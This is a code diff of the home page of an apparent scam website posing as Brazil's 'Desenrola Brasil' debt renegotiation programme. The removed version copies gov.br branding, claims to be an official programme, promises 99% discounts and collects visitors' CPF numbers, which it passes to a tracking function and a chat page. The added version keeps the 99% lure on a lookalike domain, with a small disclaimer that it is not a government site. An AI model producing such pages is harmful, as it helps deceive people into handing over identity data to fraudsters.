@@ -1,206 +1,222 @@
-import { createFileRoute } from "@tanstack/react-router";
-/** coloque uma mascara de cpf na caixa onde precisa preencher o cpf */
-import { useEffect, useState } from "react";
-import { media } from "@/lib/media";
-import { track } from "@/lib/tracking";
-const iconeGov = { url: media.iconeGov };
-const limpeNome = { url: media.limpeNomeCpf };
-const iconeFooter = { url: media.iconeFooter };
-const logoLoading = { url: "https://descomplicandobrasil.online/__l5e/assets-v1/e561af93-0349-4968-8371-23354c09fabc/logo-loading.png" };
+import { createFileRoute, Link } from "@tanstack/react-router";
 
 export const Route = createFileRoute("/")({
-  component: CpfPage,
+  component: LandingPage,
 });
 
-function CpfPage() {
-  const [cpf, setCpf] = useState("");
-  const [isLoading, setIsLoading] = useState(false);
-  const [booting, setBooting] = useState(true);
-  useEffect(() => { track("home", "home_view"); }, []);
-  useEffect(() => {
-    const t = setTimeout(() => setBooting(false), 2000);
-    return () => clearTimeout(t);
-  }, []);
-
-  const formatCPF = (v: string) => {
-    const d = v.replace(/\D/g, "").slice(0, 11);
-    if (d.length <= 3) return d;
-    if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`;
-    if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`;
-    return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
-  };
-
-  const isValidCPF = (cpf: string) => {
-    const d = cpf.replace(/\D/g, "");
-    if (d.length !== 11 || /^(\d)\1{10}$/.test(d)) return false;
-    let s = 0;
-    for (let i = 1; i <= 9; i++) s += parseInt(d.charAt(i - 1)) * (11 - i);
-    let r = (s * 10) % 11;
-    if (r === 10 || r === 11) r = 0;
-    if (r !== parseInt(d.charAt(9))) return false;
-    s = 0;
-    for (let i = 1; i <= 10; i++) s += parseInt(d.charAt(i - 1)) * (12 - i);
-    r = (s * 10) % 11;
-    if (r === 10 || r === 11) r = 0;
-    return r === parseInt(d.charAt(10));
-  };
-
-  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setCpf(formatCPF(e.target.value));
-  };
-
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    const raw = cpf.replace(/\D/g, "");
-    if (!isValidCPF(raw)) {
-      alert("CPF inválido. Verifique os dígitos.");
-      return;
-    }
-
-    track("cpf", "cpf_submit", { cpf: raw });
-    setIsLoading(true);
-
-    // Pequeno atraso para mostrar a mensagem de consulta antes do redirecionamento
-    setTimeout(() => {
-      window.location.href = `/chat?cpf=${raw}`;
-    }, 2500);
-  };
-
+function LandingPage() {
   return (
-    <div className="flex flex-col min-h-screen font-['Open_Sans',sans-serif] bg-cinza-bg">
-      <div className="flex-1 w-full max-w-[720px] mx-auto bg-azul-footer-copy">
-        <div className="bg-cinza-bg flex flex-col min-h-screen">
-          <header className="sticky top-0 z-50 flex items-center justify-between w-full min-h-[56px] px-[14px] py-2 bg-white border-b border-[#e5e5e5] shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
-            <span className="flex items-center shrink-0" aria-label="gov.br">
-              <img
-                src={iconeGov.url}
-                alt=""
-                className="h-9 w-auto max-w-[132px] block object-contain"
-                width="100"
-                height="32"
-                loading="lazy"
-                decoding="async"
-              />
-            </span>
-            <div className="flex items-center gap-0 shrink-0 ml-auto">
-              <button type="button" className="hdr-icon-btn" aria-label="Alto contraste">
-                <svg className="w-[22px] h-[22px]" viewBox="0 0 24 24">
-                  <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1451B4" strokeWidth="1.15"></circle>
-                  <path fill="#1451B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
-                  <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
-                </svg>
-              </button>
-              <span className="w-px h-[18px] bg-[#1451b440] shrink-0 mx-0" />
-              <button type="button" className="hdr-icon-btn" aria-label="Acessibilidade auditiva">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M6 8.5 a6 6 0 0 1 12 0 v3 a3 3 0 0 0 3 3 v0 a3 3 0 0 1 -3 3 h-1"></path>
-                  <path d="M18 11 v4 a4 4 0 0 1 -8 0 v-2"></path>
-                </svg>
-              </button>
-            </div>
-          </header>
-
-          <section className="relative bg-white mx-4 mt-3 mb-4 pt-5 pb-9 px-[18px] rounded-xl shadow-[0_4px_20px_rgba(0,0,0,0.08)] text-center">
-            <img className="max-w-[200px] max-h-24 w-full h-auto object-contain mx-auto mb-3.5 block" src={limpeNome.url} alt="Limpe seu nome" loading="lazy" decoding="async" />
-
-            <p className="text-sm text-cinza-texto leading-6 mb-5">
-              ✅ ATUALIZADO - Informe seu CPF e clique em "Continuar" para<br />
-              renegociar suas dívidas com descontos de 99%
-            </p>
-
-            <form className="text-left" onSubmit={handleSubmit}>
-              <div className="text-sm font-bold text-[#333] mb-2">CPF</div>
-              <input
-                className="w-full px-4 py-3.5 border border-borda-input rounded-lg text-base outline-none focus:border-azul-primario mb-4"
-                type="tel"
-                value={cpf}
-                onChange={handleCpfChange}
-                inputMode="numeric"
-                placeholder="000.000.000-00"
-                required
-              />
-
-              <button type="submit" className="btn-primary mt-0">
-                Continuar
-              </button>
-            </form>
-
-            <div className="mt-6 p-4 bg-info-bg border border-info-borda rounded-lg flex gap-3 text-left">
-              <span className="shrink-0 w-6 h-6 flex items-center justify-center bg-azul-primario text-white rounded-full text-sm font-bold">!</span>
-              <p className="text-sm text-foreground leading-snug">
-                O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
-              </p>
-            </div>
-
-            <div className="mt-6 flex justify-center gap-6 text-black">
-              <span className="flex items-center gap-1.5 text-xs">
-                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                  <rect x="5" y="11" width="14" height="10" rx="2"></rect>
-                  <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
-                </svg>
-                Conexão segura
-              </span>
-              <span className="flex items-center gap-1.5 text-xs">
-                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-                  <path d="M9 12l2 2 4-4" strokeLinecap="round" strokeLinejoin="round"></path>
-                </svg>
-                Programa oficial
-              </span>
-            </div>
-            <p className="mt-4 text-[10px] text-black">Sistema de Renegociação — Todos os direitos reservados</p>
-          </section>
-
-          <footer className="mt-auto bg-azul-footer text-white">
-            <div className="max-w-[720px] mx-auto px-5 py-8 flex flex-col items-center text-center gap-4">
-              <img src={iconeFooter.url} alt="" className="h-10 w-auto" width="120" height="40" loading="lazy" decoding="async" />
-              <div className="flex flex-col gap-1">
-                <p className="text-xs opacity-80">Todo o conteúdo deste site está publicado sob a licença</p>
-                <strong className="text-sm font-bold">Sistema de Renegociação — Todos os direitos reservados</strong>
-              </div>
-            </div>
-            <div className="bg-azul-footer-copy h-2 w-full" />
-          </footer>
-        </div>
-      </div>
-
-      {booting && (
-        <div className="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-white">
+    <>
+      <style>{`
+        body {
+          font-family: Arial, Helvetica, sans-serif;
+          background: #ececec;
+          color: #1f3f93;
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+        }
+        * {
+          box-sizing: border-box;
+        }
+        .page-wrapper {
+          width: 100%;
+        }
+        .hero-section {
+          width: 100%;
+          background: #ddd;
+        }
+        .hero-image {
+          width: 100%;
+          height: auto;
+          display: block;
+        }
+        .content-card {
+          width: calc(100% - 60px);
+          max-width: 690px;
+          margin: 14px auto 22px;
+          background: #ffffff;
+          border-radius: 14px;
+          padding: 36px 24px 40px;
+          text-align: center;
+        }
+        .logo-icon {
+          width: 80px;
+          max-width: 100%;
+          display: block;
+          margin: 0 auto 8px;
+        }
+        .logo-text {
+          width: 320px;
+          max-width: 88%;
+          display: block;
+          margin: 0 auto 26px;
+        }
+        .headline {
+          font-size: 19px;
+          line-height: 1.35;
+          font-weight: 700;
+          color: #1d4fb4;
+          margin-bottom: 24px;
+        }
+        .subheadline {
+          font-size: 18px;
+          line-height: 1.35;
+          color: #333333;
+          margin-bottom: 26px;
+        }
+        .cta-button {
+          display: inline-flex;
+          align-items: center;
+          justify-content: center;
+          width: 294px;
+          max-width: 100%;
+          min-height: 50px;
+          padding: 14px 28px;
+          background: #2552b5;
+          color: #ffffff;
+          text-decoration: none;
+          font-size: 18px;
+          font-weight: 700;
+          border-radius: 999px;
+          transition: opacity 0.2s ease;
+        }
+        .cta-button:hover {
+          opacity: 0.92;
+        }
+        .site-footer {
+          margin-top: 28px;
+          padding-top: 22px;
+          border-top: 1px solid #e5e7eb;
+          text-align: center;
+        }
+        .footer-links {
+          display: flex;
+          justify-content: center;
+          gap: 18px;
+          flex-wrap: wrap;
+          margin-bottom: 16px;
+        }
+        .footer-links a {
+          color: #2552b5;
+          text-decoration: none;
+          font-size: 14px;
+          font-weight: 600;
+        }
+        .footer-links a:hover {
+          text-decoration: underline;
+        }
+        .footer-note {
+          margin-top: 14px;
+          color: #6b7280;
+          font-size: 13px;
+          line-height: 1.6;
+        }
+        @media (max-width: 768px) {
+          .content-card {
+            width: calc(100% - 30px);
+            padding: 30px 20px 34px;
+          }
+          .logo-icon {
+            width: 72px;
+          }
+          .logo-text {
+            width: 290px;
+            margin-bottom: 22px;
+          }
+          .headline {
+            font-size: 17px;
+            margin-bottom: 20px;
+          }
+          .subheadline {
+            font-size: 17px;
+            margin-bottom: 24px;
+          }
+          .cta-button {
+            width: 280px;
+            font-size: 17px;
+          }
+        }
+        @media (max-width: 480px) {
+          .content-card {
+            width: calc(100% - 20px);
+            margin: 10px auto 16px;
+            border-radius: 12px;
+            padding: 28px 18px 30px;
+          }
+          .logo-icon {
+            width: 64px;
+            margin-bottom: 6px;
+          }
+          .logo-text {
+            width: 250px;
+            max-width: 92%;
+            margin-bottom: 18px;
+          }
+          .headline {
+            font-size: 15px;
+            line-height: 1.4;
+          }
+          .subheadline {
+            font-size: 15px;
+            line-height: 1.35;
+          }
+          .cta-button {
+            width: 100%;
+            font-size: 16px;
+            min-height: 48px;
+          }
+          .footer-links {
+            gap: 12px;
+          }
+          .footer-links a {
+            font-size: 12px;
+          }
+        }
+      `}</style>
+      <main className="page-wrapper">
+        <section className="hero-section">
           <img
-            src={logoLoading.url}
-            alt="Desenrola"
-            className="w-[140px] max-w-[45vw] h-auto object-contain animate-fade-in"
-            width="140"
-            height="115"
+            src="https://www.desenrolebrasil.online/images/hero.png"
+            alt="Pessoa segurando celular com tela de consulta"
+            className="hero-image"
           />
-          <div
-            className="mt-8 w-8 h-8 rounded-full border-[3px] border-amarelo/25 border-t-amarelo animate-spin"
-            role="status"
-            aria-label="Carregando"
+        </section>
+        <section className="content-card">
+          <img
+            src="https://www.desenrolebrasil.online/images/logo-icon.png"
+            alt="Ícone Desenrola Brasil"
+            className="logo-icon"
           />
-        </div>
-      )}
-
-      {isLoading && (
-        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50 backdrop-blur-sm animate-in fade-in duration-300">
-          <div className="bg-white rounded-2xl p-8 flex flex-col items-center gap-5 shadow-2xl max-w-[90%] w-[320px] text-center transform animate-in zoom-in-95 duration-300">
-            <div className="relative">
-              <div className="w-14 h-14 border-4 border-azul-primario/20 border-t-azul-primario rounded-full animate-spin"></div>
-              <div className="absolute inset-0 flex items-center justify-center">
-                <svg className="w-6 h-6 text-azul-primario" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
-                  <path d="M21 12a9 9 0 11-6.219-8.56" strokeLinecap="round" />
-                </svg>
-              </div>
+          <img
+            src="https://www.desenrolebrasil.online/images/logo-text.png"
+            alt="Desenrola Brasil"
+            className="logo-text"
+          />
+          <h1 className="headline">
+            O Programa Desenrola Brasil<br />
+            possibilita a renegociação de dívidas<br />
+            com descontos de até 99%
+          </h1>
+          <p className="subheadline">
+            Clique no botão abaixo para<br />
+            acessar a plataforma
+          </p>
+          <Link to="/cpf" className="cta-button">
+            ACESSAR AGORA
+          </Link>
+          <footer className="site-footer">
+            <div className="footer-links">
+              <Link to="/politica-de-privacidade">Política de Privacidade</Link>
+              <Link to="/termos-de-uso">Termos de Uso</Link>
             </div>
-            <div>
-              <h3 className="text-azul-primario font-bold text-lg mb-1">Aguarde</h3>
-              <p className="text-cinza-texto text-sm leading-relaxed">
-                Estamos localizando suas propostas exclusivas no sistema...
-              </p>
-            </div>
-          </div>
-        </div>
-      )}
-    </div>
+            <p className="footer-note">
+              Serviço de consulta e orientação para regularização<br />
+              Condições sujeitas a análise. Este site não é um portal do governo.
+            </p>
+          </footer>
+        </section>
+      </main>
+    </>
   );
 }
